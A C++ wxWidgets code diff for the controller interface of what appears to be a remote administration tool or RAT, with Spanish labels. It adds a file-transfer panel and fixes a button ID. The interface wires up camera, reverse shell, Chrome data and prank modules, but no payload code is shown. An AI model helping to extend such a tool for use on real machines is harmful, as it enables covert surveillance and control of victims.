@@ -38,6 +38,7 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, struct Cliente
     this->SetTitle(strTitle);
 
     this->sckCliente = _sckSocket;
+    this->strClienteID = _strID;
 
     //////////////////////////////////////////////////
     //Administrador de archivos
@@ -96,7 +97,8 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, struct Cliente
     wxButton* btn_RemoteDesk = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Remote_Desktop, "Escritorio Remoto");
     wxButton* btn_Informacion = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Informacion, "Informacion");
     wxButton* btn_Bromas = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Fun, "Bromas");
-    wxButton* btn_Shell = new wxButton(pnl_Mods, EnumFrameIDS::BNT_Shell, "Shell Inversa");
+    wxButton* btn_Shell = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Shell, "Shell Inversa");
+    wxButton* btn_Transferencias = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Transferencias, "Transferencias");
     //btn_Bromas->SetBitmap(wxBitmap(wxT("./prank.png"), wxBITMAP_TYPE_PNG));
 
     wxGridSizer* btnGrid = new wxGridSizer(4, 2, 5, 5);
@@ -107,6 +109,7 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, struct Cliente
     btnGrid->Add(btn_Informacion, 1, wxALL | wxEXPAND);
     btnGrid->Add(btn_Bromas, 1, wxALL | wxEXPAND);
     btnGrid->Add(btn_Shell, 1, wxALL | wxEXPAND);
+    btnGrid->Add(btn_Transferencias, 1, wxALL | wxEXPAND);
 
     box_mod->Add(btnGrid, 0, wxALL | wxEXPAND);
 
@@ -404,7 +407,7 @@ void FrameCliente::OnButton(wxCommandEvent& event) {
         panelCamara* panelCam = new panelCamara(this, this->sckCliente);
         panelCam->Show();
     } else if (btnID == EnumFrameIDS::BTN_Adm_Ventanas) {
-        panelWManager* panelVentanas = new panelWManager(this, this->sckCliente);
+        panelWManager* panelVentanas = new panelWManager(this, this->sckCliente, this->strClienteID);
         panelVentanas->Show();
     } else if (btnID == EnumFrameIDS::BTN_Adm_Procesos) {
         panelProcessManager* panelProcesos = new panelProcessManager(this, this->sckCliente);
@@ -421,10 +424,13 @@ void FrameCliente::OnButton(wxCommandEvent& event) {
     } else if (btnID == EnumFrameIDS::BTN_Fun) {
         panelFun* panelF = new panelFun(this, this->sckCliente);
         panelF->Show();
-    } else if (btnID == EnumFrameIDS::BNT_Shell) {
+    } else if (btnID == EnumFrameIDS::BTN_Shell) {
         this->panelShell = new panelReverseShell(this, this->sckCliente);
         this->panelShell->Show();
-    }else if (btnID == EnumFrameIDS::BTN_Limpiar_Log) {
+    } else if(btnID == EnumFrameIDS::BTN_Transferencias){
+        this->panelTransfers = new panelTransferencias(this, this->strClienteID);
+        this->panelTransfers->Show();
+    } else if (btnID == EnumFrameIDS::BTN_Limpiar_Log) {
         this->txtLog->Clear();
     }
     
@@ -466,7 +472,7 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         } else if (wStr == "Transferencias") {
             this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
         } else if (wStr == "Admin de Ventanas") {
-            this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente), wStr, true);
+            this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente, this->strClienteID), wStr, true);
         } else if (wStr == "Chrome") {
             this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
         } else if (wStr == "Usuarios") {
